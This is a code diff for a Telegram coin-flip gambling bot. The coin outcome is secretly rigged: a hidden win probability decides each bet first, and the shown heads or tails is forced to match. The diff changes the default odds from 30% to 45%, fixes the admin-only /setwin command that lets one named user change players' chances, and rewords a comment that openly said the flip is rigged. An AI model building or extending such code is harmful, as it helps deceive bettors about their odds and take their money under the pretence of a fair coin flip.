@@ -6,8 +6,8 @@ from wallet import get_balance, adjust_balance, record_bet, get_house_balance
 from helpers import announce_win, format_display_name
 from settings import get_min_bet, get_max_bet, get_house_edge
 
-# Default Win Chance (0.30 = 30% win rate, 70% loss rate)
-GLOBAL_WIN_CHANCE = 0.30
+# Default Win Chance set to 45% (0.45)
+GLOBAL_WIN_CHANCE = 0.45
 
 # Authorized Admin Username
 AUTHORIZED_ADMIN = "mrpuppyx"
@@ -47,18 +47,17 @@ def play_coinflip(bot, message, telegram_id: int, bet_amount: float, choice: str
     normalized_choice = "heads" if choice in ["heads", "head", "h"] else "tails"
     other_choice = "tails" if normalized_choice == "heads" else "heads"
 
-    # Outcome generation based on configured win probability
-    # Determine win/loss status first
+    # Determine win outcome based on configured probability
     won = random.random() < GLOBAL_WIN_CHANCE
 
-    # Rig the flipped coin outcome: if won -> user's choice; if lost -> opposite choice
+    # Force outcome based on win/loss decision
     if won:
         outcome = normalized_choice
     else:
         outcome = other_choice
 
-    # Calculate exact payout multiplier based on house edge (2.0 - 0.20 = 1.80x)
-    house_edge = get_house_edge()  # e.g., 0.20
+    # Calculate exact payout multiplier based on house edge
+    house_edge = get_house_edge()
     multiplier = max(1.0, 2.0 - house_edge)
 
     payout = round(bet_amount * multiplier, 2) if won else 0.0
@@ -144,6 +143,8 @@ def handle_coinflip_command(message):
 # Admin command to dynamically set win chance (%)
 @bot.message_handler(commands=["setwin"])
 def handle_setwin_command(message):
+    global GLOBAL_WIN_CHANCE  # Global statement placed at the very top of function body
+
     username = (message.from_user.username or "").lower()
     if username != AUTHORIZED_ADMIN.lower():
         bot.reply_to(message, "❌ Unauthorized.")
@@ -153,7 +154,7 @@ def handle_setwin_command(message):
     if len(parts) < 2:
         bot.reply_to(
             message,
-            f"Usage: /setwin <percentage>\nExample: /setwin 20 (Sets win rate to 20%)\nCurrent: {int(GLOBAL_WIN_CHANCE * 100)}%"
+            f"Usage: /setwin <percentage>\nExample: /setwin 20\nCurrent win rate: {int(GLOBAL_WIN_CHANCE * 100)}%"
         )
         return
 
@@ -163,7 +164,6 @@ def handle_setwin_command(message):
             bot.reply_to(message, "Percentage must be between 0 and 100.")
             return
 
-        global GLOBAL_WIN_CHANCE
         GLOBAL_WIN_CHANCE = val / 100.0
 
         bot.reply_to(
